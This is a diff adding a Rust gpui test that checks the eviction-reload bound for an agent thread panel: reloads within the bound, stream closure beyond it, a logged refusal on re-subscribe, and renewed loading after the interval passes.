+#[gpui::test]
+async fn the_eviction_reload_bound_holds_across_the_panels_re_subscribes(cx: &mut TestAppContext) {
+    init(cx);
+    let fs = shared_fs(cx).await;
+    let app = window(&fs, "/p/app", Some(loadable_connection()), cx).await;
+    let (_announce, panel) = connect_panel("/p/app", 1, &app, cx);
+    let thread = created_thread(&panel, &app, cx);
+    promote(&thread, cx);
+    let app_state = app.app_state();
+    panel.handle(subscribe("s", &thread), &app_state, cx);
+    assert_eq!(reply(&panel.drain(cx), "s")["kind"], "snapshot");
+
+    for n in 0..EVICTION_RELOADS {
+        evict_idle_threads(cx);
+        let got = kinds(&panel.drain(cx));
+        assert!(
+            !got.contains(&"thread_closed".to_string()),
+            "release {n} is within the bound: reloaded, not ended: {got:?}"
+        );
+        assert!(
+            got.contains(&"snapshot".to_string()),
+            "release {n}: the reload sends a fresh snapshot: {got:?}"
+        );
+    }
+    evict_idle_threads(cx);
+    assert!(
+        kinds(&panel.drain(cx)).contains(&"thread_closed".to_string()),
+        "one release over the bound ends the stream"
+    );
+
+    // The panel re-subscribes, as its page does on `thread_closed`. The bound is not refilled:
+    // the thread is not loaded again, so retention has nothing to release, and the answer says
+    // the agent could not start (never `not_found`: the thread is still the panel's, R5.8).
+    let id = thread_id_of(&thread, cx);
+    assert_eq!(view_of(&app, id), None, "released, so not loaded");
+    let refused = panel_refusals("subscribe").len();
+    panel.handle(subscribe("again", &thread), &app_state, cx);
+    let answer = reply(&panel.drain(cx), "again");
+    assert_eq!(answer["kind"], "error", "{answer}");
+    assert_eq!(answer["error"], "agent_start_failed", "{answer}");
+    assert_eq!(answer["fatal"], false);
+    assert!(!panel.closed());
+    assert_eq!(view_of(&app, id), None, "a spent budget loads nothing");
+    let lines = panel_refusals("subscribe");
+    assert_eq!(lines.len(), refused + 1, "R9.1: the refusal is logged");
+    assert!(
+        lines[refused].contains(&thread) && lines[refused].contains("error=agent_start_failed"),
+        "{}",
+        lines[refused]
+    );
+
+    // Once the interval has passed, a subscribe loads it, and a release is reloaded again.
+    cx.executor()
+        .advance_clock(EVICTION_RELOAD_INTERVAL + Duration::from_secs(1));
+    panel.handle(subscribe("later", &thread), &app_state, cx);
+    assert_eq!(reply(&panel.drain(cx), "later")["kind"], "snapshot");
+    evict_idle_threads(cx);
+    let got = kinds(&panel.drain(cx));
+    assert!(
+        !got.contains(&"thread_closed".to_string()),
+        "a new interval has a new bound: {got:?}"
+    );
+}
